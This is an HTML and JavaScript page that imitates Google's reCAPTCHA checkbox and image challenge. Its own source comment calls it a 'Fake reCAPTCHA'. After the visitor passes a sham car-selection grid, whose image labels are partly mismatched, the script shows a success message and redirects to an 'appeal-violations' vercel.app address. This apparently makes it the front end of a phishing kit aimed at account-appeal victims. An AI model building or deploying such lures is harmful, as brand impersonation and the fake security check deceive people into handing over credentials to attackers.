<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>reCAPTCHA</title>
  <style>
    body {
      background: #f0f2f5;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .captcha-box {
      display: flex;
      align-items: center;
      border: 1px solid #d3d3d3;
      border-radius: 4px;
      padding: 15px;
      background: white;
      width: 302px;
      box-shadow: 0px 0px 4px rgba(0,0,0,0.1);
      cursor: pointer;
      position: relative;
    }

    .captcha-checkbox {
      width: 22px;
      height: 22px;
      border: 2px solid #c1c1c1;
      border-radius: 3px;
      margin-right: 12px;
      position: relative;
    }

    .captcha-checkbox.checked::after {
      content: "✔";
      font-size: 18px;
      color: green;
      position: absolute;
      top: -3px;
      left: 3px;
    }

    .captcha-label {
      font-size: 16px;
      color: #555;
    }

    .captcha-brand {
      position: absolute;
      right: 10px;
      bottom: 10px;
      font-size: 10px;
      color: #999;
    }

    .captcha-brand img {
      height: 18px;
      vertical-align: middle;
    }
     #startChallengeBtn {
      display: none;
      margin-top: 15px;
      background: #1877f2;
      color: white;
      padding: 8px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .modal, .success-modal {
      display: none;
      position: fixed;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .modal-content, .success-modal-content {
      background: white;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      width: 350px;
    }

    .images-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 15px;
    }

    .images-grid img {
      width: 100%;
      height: 100px;
      object-fit: cover;
      cursor: pointer;
      border: 2px solid transparent;
      border-radius: 4px;
    }

    .images-grid img.selected {
      border-color: green;
    }

    #continueBtn {
      display: none;
      margin-top: 20px;
      background: #1877f2;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <!-- Fake reCAPTCHA -->
  <div class="captcha-box" onclick="openImageChallenge()">
    <div class="captcha-checkbox" id="checkBox"></div>
    <div>
      <div class="captcha-label">I'm not a robot</div>
      <div class="captcha-brand">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
        <span>reCAPTCHA</span><br>
        <a href="#" style="font-size: 9px; color:#aaa;">Privacy</a> - 
        <a href="#" style="font-size: 9px; color:#aaa;">Terms</a>
      </div>
    </div>
  </div>

   <!-- Continue button -->
    <button id="startChallengeBtn" onclick="openImageChallenge()">Continue</button>
  </div>

  <!-- Modal Image Challenge -->
  <div class="modal" id="imageModal">
    <div class="modal-content">
      <h3>Select all images with <strong>cars</strong></h3>
      <div class="images-grid" id="imageGrid">
        <!-- 3 car images -->
        <img src="images/car1.jpg" data-type="car" onclick="selectImage(this)">
        <img src="images/car2.jpg" data-type="bike" onclick="selectImage(this)">
        <img src="images/car3.jpg" data-type="car" onclick="selectImage(this)">
        <!-- 3 bike images -->
        <img src="images/bike1.jpg" data-type="bike" onclick="selectImage(this)">
        <img src="images/bike2.jpg" data-type="bike" onclick="selectImage(this)">
        <img src="images/bike3.jpg" data-type="car" onclick="selectImage(this)">
      </div>
      <button id="continueBtn" onclick="verifyChallenge()">Verifying</button>
    </div>
  </div>

  <!-- Verified Modal -->
  <div class="success-modal" id="successModal">
    <div class="success-modal-content">
      <h2>✅ Verified Successfully</h2>
      <p>Redirecting...</p>
    </div>
  </div>

  <script>
    let selectedCount = 0;

    function openImageChallenge() {
      document.getElementById('imageModal').style.display = 'flex';
    }

    function selectImage(img) {
      if (img.classList.contains('selected')) return;

      img.classList.add('selected');

      if (img.dataset.type === 'car') {
        selectedCount++;
      }

      if (selectedCount === 3) {
        document.getElementById('continueBtn').style.display = 'block';
      }
    }

    function verifyChallenge() {
      document.getElementById('imageModal').style.display = 'none';
      document.getElementById('checkBox').classList.add('checked');
      document.getElementById('successModal').style.display = 'flex';

      setTimeout(() => {
        window.location.href = "https://appeal-violations-request-here.vercel.app/";
      }, 1500);
    }
  </script>

</body>
</html>
